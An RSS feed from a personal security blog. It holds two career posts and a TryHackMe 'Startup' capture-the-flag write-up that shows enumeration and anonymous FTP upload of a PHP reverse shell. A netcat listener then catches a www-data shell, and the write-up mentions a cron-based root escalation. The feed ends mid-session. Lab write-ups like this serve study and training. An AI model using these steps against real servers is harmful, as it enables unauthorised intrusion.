<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Phil Malle</title>
    <description>This is my personal blog about technologies, Cyber-Security and other similar topics. </description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 11 Jul 2021 19:51:45 +0000</pubDate>
    <lastBuildDate>Sun, 11 Jul 2021 19:51:45 +0000</lastBuildDate>
    <generator>Jekyll v4.2.0</generator>

    
      <item>
        <title>Pen-Testing - Certification</title>
        <description>&lt;h1 id=&quot;pen-testing---certification&quot;&gt;Pen-Testing - Certification&lt;/h1&gt;

&lt;p&gt;The last weeks or better month, i was working on TryhackMe and HacktheBox. On this Platforms i was learning a lot of Cyber Security and Hacking. 
But i was thinking about to prove myself.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I want a new challange.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So i was thinking what can i do, to prove myself what i am learning on this Platform. 
This question can actually only answered with one anser.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I NEED A PEN-TESTING CERTIFICATION!!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;But what certification would be a great start. I thought i should go for OSCP. But the thing is, this Certification exam is hard. 
I decided to work harder on my skills and by the end of the year i want to get the OSCP-Certification. 
This is always in my head since i have started my journey in Cyber-Security and hacking.&lt;/p&gt;

&lt;p&gt;On the other hand. i want to get more expirince and more Certification. 
Luckely for me, in the spring of 2021 there is a new Pen-Testing certification out there.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The Cyber Menotor&lt;/strong&gt; have added a certification to his portfolio. 
And this certificaiton is called &lt;strong&gt;PNPT - practical network penetration tester&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;At this point when i heard about the certification, i knew i had to take this exam.&lt;/p&gt;

&lt;p&gt;So i bought a voucher for the Exam. :) 
now i have to study and get my hands on the keyboard for this certification.&lt;/p&gt;

&lt;p&gt;In this Blog i will descripe my way through the learning process of the PNPT-Certification.&lt;/p&gt;

&lt;h2 id=&quot;pnpt---certification&quot;&gt;PNPT - Certification&lt;/h2&gt;

&lt;p&gt;This Certification contains 5 Sub-categories witch will be done in the exam.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Practical Ethical Hacking&lt;/li&gt;
  &lt;li&gt;Linux Privilage Escalation for Beginners&lt;/li&gt;
  &lt;li&gt;Windows Privilage Escalation for Beginners&lt;/li&gt;
  &lt;li&gt;Open Source Intelligence (OSINT) Fundamentals&lt;/li&gt;
  &lt;li&gt;External Pentest Playbook&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This courses are also available on the TCM-Security Academy. 
And when you buy the voucher of the Exam you can choice between two options. With or without the course Material.&lt;/p&gt;

&lt;p&gt;I have bought the course material a few month ago, when there was no certification around. 
But when i heard of the certification, i knew i had the course material now i have to study.&lt;/p&gt;

&lt;h3 id=&quot;journey&quot;&gt;Journey&lt;/h3&gt;

&lt;p&gt;So what will i do to achieve this goal.&lt;/p&gt;

&lt;p&gt;I will work through the course Material. I will try to post a blog post of every interessting topic witch i will learn in this course.&lt;/p&gt;

&lt;p&gt;After i have finished the course material i will work on TryHackMe and HacktheBox to get hands on. 
As i know, in the exam there is a windows domain i will also work on the throwback network on TryHackMe.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hacking plan&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;TCM-Security Academy
    &lt;ol&gt;
      &lt;li&gt;Practical Ethical Hacking&lt;/li&gt;
      &lt;li&gt;Open-Source Intelligence (OSINT) Fundamentals&lt;/li&gt;
      &lt;li&gt;External Pentest Playbook&lt;/li&gt;
      &lt;li&gt;Linux Privilage Escalation for Beginners&lt;/li&gt;
      &lt;li&gt;Windows Privilage Escalation for Beginners&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;TryHackMe
    &lt;ol&gt;
      &lt;li&gt;Active Directory Rooms&lt;/li&gt;
      &lt;li&gt;Wreath Network&lt;/li&gt;
      &lt;li&gt;Throwback Network&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;HackTheBox
    &lt;ol&gt;
      &lt;li&gt;Windows Boxes&lt;/li&gt;
      &lt;li&gt;Linux Boxes&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will be my plan to get this certification. I think i will take the exam end of September. :) 
So i have 3 month to study, that should be possible. :)&lt;/p&gt;

&lt;p&gt;When i have successfully pased this exam, i will go for the OSCP-Certificaiton.&lt;/p&gt;
</description>
        <pubDate>Fri, 18 Jun 2021 21:00:00 +0000</pubDate>
        <link>/blog/pnpt-certification/</link>
        <guid isPermaLink="true">/blog/pnpt-certification/</guid>
      </item>
    
      <item>
        <title>Welcome to my first Blog-Entry !</title>
        <description>&lt;h1 id=&quot;first-blog-entry&quot;&gt;First Blog-Entry&lt;/h1&gt;

&lt;p&gt;Today i have started with my personal blog. I hope i will find the time to write about the things i like to speak about. 
In this case, the most topics will be about my personal journey to become a Cyber-Security Professional or Pentester.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I will work on different platforms to get closer to my goal.&lt;/p&gt;

&lt;p&gt;These platforms will be:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;HackTheBox&lt;/li&gt;
  &lt;li&gt;TryHackme&lt;/li&gt;
  &lt;li&gt;Vulnhub&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I will also play CTF’s.&lt;/p&gt;

&lt;p&gt;Therefore i have registered an account on ctftime.org. 
On this Web-Site the will inform me about upcoming CTF’s around the world.&lt;/p&gt;

&lt;h2 id=&quot;certification&quot;&gt;Certification&lt;/h2&gt;

&lt;p&gt;Another topic witch i will be posting about will be my ongoing certification. 
 I have planed a few certification i want to go for my Cyber-Security carrer.&lt;/p&gt;

&lt;p&gt;I want to go two ways in on the Certifications. My decicion was to go both roads. Red and Blue Teaming. 
 so my Certification will be:&lt;/p&gt;

&lt;h3 id=&quot;red-team&quot;&gt;Red Team:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;OSCP (Offensive Security Certified Professional) by &lt;a href=&quot;https://www.offensive-security.com/pwk-oscp/&quot;&gt;Offensive Security&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;PNPT (Practival Network Penetration Tester) by &lt;a href=&quot;https://certifications.tcm-sec.com/pnpt/&quot;&gt;TCM-Sec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;blue-team&quot;&gt;Blue Team:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;IHRP (Incident Handling &amp;amp; Response Professional) by &lt;a href=&quot;https://elearnsecurity.com/product/ecir-certification/&quot;&gt;eLearnSecurity&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;BTL1 (Blue Team Level 1) by &lt;a href=&quot;https://securityblue.team/certifications/&quot;&gt;Blue Team Security&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;BTL2 (Blue Team Level 2) by &lt;a href=&quot;https://securityblue.team/btl2/&quot;&gt;Blue Team Security&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This are my Certification i want to go throuh in the next 2 Years.&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Apr 2021 20:05:00 +0000</pubDate>
        <link>/blog/welcome-to-my-first-blog-entry/</link>
        <guid isPermaLink="true">/blog/welcome-to-my-first-blog-entry/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - Startup</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Startup&lt;/td&gt;
      &lt;td&gt;09.11.2020&lt;/td&gt;
      &lt;td&gt;easy&lt;/td&gt;
      &lt;td&gt;Wireshark, gobuster, cron, enumeration&lt;/td&gt;
      &lt;td&gt;2h 40min&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;tasks&quot;&gt;tasks&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ID&lt;/th&gt;
      &lt;th&gt;Status&lt;/th&gt;
      &lt;th&gt;UUID&lt;/th&gt;
      &lt;th&gt;Age&lt;/th&gt;
      &lt;th&gt;Done&lt;/th&gt;
      &lt;th&gt;Project&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;Completed&lt;/td&gt;
      &lt;td&gt;cde461e7&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
      &lt;td&gt;1h&lt;/td&gt;
      &lt;td&gt;THM-Startup&lt;/td&gt;
      &lt;td&gt;Starting up Target.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;Completed&lt;/td&gt;
      &lt;td&gt;e8728a9e&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
      &lt;td&gt;THM-Startup&lt;/td&gt;
      &lt;td&gt;What is the secret spicy soup recipe?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;Completed&lt;/td&gt;
      &lt;td&gt;59aaab62&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
      &lt;td&gt;THM-Startup&lt;/td&gt;
      &lt;td&gt;What are the contents of user.txt&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;Completed&lt;/td&gt;
      &lt;td&gt;66e829ab&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
      &lt;td&gt;2h&lt;/td&gt;
      &lt;td&gt;THM-Startup&lt;/td&gt;
      &lt;td&gt;What are the contents of root.txt&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;duration&quot;&gt;Duration&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Recorded “THM-Startup”&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Started 2020-11-09 T19:27:04&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ended               22:06:21&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Total               2:39:17&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;namp&lt;/td&gt;
      &lt;td&gt;nmap -sC -sV -oN nmap/initial $ip&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ftp&lt;/td&gt;
      &lt;td&gt;ftp $ip&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;gobuster&lt;/td&gt;
      &lt;td&gt;gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;nc&lt;/td&gt;
      &lt;td&gt;nc -lnvp 9901&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;open-ports&quot;&gt;open ports&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;ftp-server&lt;/td&gt;
      &lt;td&gt;vsftpd 3.0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.2p2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;Http-Server&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;summary-spoiler&quot;&gt;Summary (Spoiler)&lt;/h1&gt;

&lt;p&gt;As always i have started with a nmap scan of the Target. The nmap scan shows me that there are three-ports open on the Target. 
The next step as i saw was a gobuster scan on the the Web-Server. Beside the gobuster scan i login in to the FTP-Server and check if there is something interessting on this ftp-share. I also saw a text file in the nmap scan output. 
The next step was to get access to Web-Server. This could be done with a reverse-shell uploaded to the FTP-Server.&lt;/p&gt;

&lt;p&gt;After that we cann run the php file and we get access to the server.&lt;/p&gt;

&lt;p&gt;On the Target we have to figure out how we can get to the user account. Because we are logged in as “www-data” and we have no rights to do anything on this target.&lt;/p&gt;

&lt;p&gt;On the target there is a Wireshark file located witch contains a password for the user. When we got the password we can loggin in and countiue for the root access.&lt;/p&gt;

&lt;p&gt;The root acces has something to do with cronjobs. I have addedd a bash reverse shell to the a specific file and then waited for the connection back to my machine. 
When the connection is done we have root rights on the target.&lt;/p&gt;

&lt;h1 id=&quot;start-enumeration&quot;&gt;Start Enumeration&lt;/h1&gt;

&lt;h2 id=&quot;nmap-scan-output&quot;&gt;Nmap Scan-Output&lt;/h2&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-11-09 19:33 CET
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.180.221
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.11s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;NSE: writeable]
|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.170.39
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 &lt;span class=&quot;nb&quot;&gt;dd&lt;/span&gt;:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Maintenance
Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.14 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;noticetxt-output&quot;&gt;notice.txt output&lt;/h2&gt;

&lt;p&gt;output of text file form ftp-share:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bat notice.txt
───────┬──────────────────────────────────────────────────────────────────
       │ File: notice.txt
───────┼──────────────────────────────────────────────────────────────────
   1   │ Whoever is leaving these damn Among Us memes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this share, it IS
       │  NOT FUNNY. People downloading documents from our website will th
       │ ink we are a joke! Now I dont know &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;it is, but Maya is looking
       │  pretty sus.
───────┴──────────────────────────────────────────────────────────────────  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;testlog-output&quot;&gt;test.log output&lt;/h2&gt;

&lt;p&gt;Found another file on the share (hidden file).&lt;/p&gt;

&lt;p&gt;output of the test.log file form FTP-share:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ bat test.log
───────┬──────────────────────────────────────────────────────────────────
       │ File: test.log
───────┼──────────────────────────────────────────────────────────────────
   1   │ &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
───────┴──────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;gobuster-output&quot;&gt;gobuster output&lt;/h2&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://startup.thm &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.0.1
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@_FireFart_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:            http://startup.thm
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:        10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes:   200,204,301,302,307,401,403
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:     gobuster/3.0.1
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:        10s
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2020/11/10 08:19:18 Starting gobuster
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
/files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/server-status &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
2020/11/10 08:45:13 Finished
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Gobuster shows me that there is a file-folder on the Web-Server. After checking the folder i know that this is the FTP-Folder.&lt;/p&gt;

&lt;h1 id=&quot;weaponization&quot;&gt;Weaponization&lt;/h1&gt;

&lt;p&gt;After Enumeration the Web-Site, the FTP-Share i have figured out, how i can get access to the Web-Server.&lt;/p&gt;

&lt;p&gt;In the enuermation i found out, that the FTP-folder on the FTP-Share is writeaple:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;NSE: writeable]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can upload a reverse shell to the share and execute it from the Browser. This is possible due that fact that the ftp-folder is also accessible from the Web-Browser.&lt;/p&gt;

&lt;p&gt;I used the php-reverse-shell scirpt witch is located in kali:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ locate php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the script i changed the IP-Address and the port whitch i use for the reverse-shell to call back to me.&lt;/p&gt;

&lt;h1 id=&quot;delivery&quot;&gt;Delivery&lt;/h1&gt;

&lt;p&gt;The next step is deliver the reverse-shell to the ftp-folder. Due that fact that anonymous login is available we can upload the shell via command line to the ftp-folder.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ftp startup.thm
Connected to startup.thm.
220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;startup.thm:fr3akazo1d&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ftp
250 Directory successfully changed.
ftp&amp;gt; put shell.php
&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;: shell.php remote: shell.php
200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.00 secs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.7520 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have a php-reverse-shell script on the FTP-Server:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/thm-images/THM-Startup-3.png&quot; alt=&quot;Shell uploaded to FTP-Share&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;The Exploitation is a simple step on this target. We only have to run the shell.php script in the Web-Browser by simple clicking on the file.&lt;/p&gt;

&lt;p&gt;I have started a netcat listener on my machine so i get back the reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9901
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9901 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.9.170.39] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.76.61] 50996
Linux startup 4.4.0-190-generic &lt;span class=&quot;c&quot;&gt;#220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 07:44:37 up 28 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ date
Tue Nov 10 07:44:59 UTC 2020
$ 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now We can have a look into the Files.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@startup:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;bin   etc   initrd.img.old  media  recipe.txt  snap  usr      vmlinuz.old
boot  home    lib     mnt  root      srv   vagrant
data  incidents   lib64     opt  run       sys   var
dev   initrd.img  lost+found    proc   sbin      tmp   vmlinuz
www-data@startup:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
